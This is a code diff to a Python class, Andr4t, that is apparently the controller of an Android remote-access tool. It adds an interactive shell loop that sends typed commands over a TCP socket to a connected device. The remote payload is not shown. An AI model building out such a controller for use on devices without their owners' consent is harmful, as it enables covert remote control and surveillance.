@@ -4,7 +4,13 @@ from pathlib import Path
 
 parent_dir = str(Path(__file__).parent.parent)
 sys.path.append(parent_dir + r'\tcp')
+sys.path.append(parent_dir + r'\console')
+sys.path.append(parent_dir + r'\command')
+sys.path.append(parent_dir + r'\define')
 from tcp import Socket
+from console import Console
+from define import Define
+from command import Command
 
 #  _   _ _  _   _              _              _      _  _   _
 # | | | | || | | |            / \   _ __   __| |_ __| || | | |_
@@ -15,10 +21,41 @@ from tcp import Socket
 
 
 class Andr4t:
+    
     def __init__(self, ip, port) -> None:
         self.__socket = Socket(ip, port)
         self.__socket.start()
     
     def get_shell(self) -> None:
-        if (not self.__socket.send(bytes("Hello World", 'utf-8'))):
-            return
+        print("== shell open == \n")
+        while True:
+            try:
+                command = input("#")
+                if not self.execute_command(command):
+                    continue
+                Console.printl(f"Succeed to execute {command}", Define.LogType.SUCCESS)
+            except Exception as e:
+                Console.print(e, Define.LogType.Failed)
+                return
+        
+    def execute_command(self, command: str) -> bool:
+        """
+        コマンド実行
+
+        Args:
+            command (str): ユーザーから入力を受けたコマンド
+
+        Returns:
+            bool: コマンド実行結果
+        """
+        try:
+            cmd_bytes = Command.make_command(command)
+            if cmd_bytes is None:
+                return False
+            
+            self.__socket.send(cmd_bytes)
+            return True
+        except Exception as e:
+            Console.printl(f"Failed to execute {command}. \n Please check connection status.", Define.LogType.ERROR)
+            Console.printl(e, Define.LogType.ERROR)
+            return False
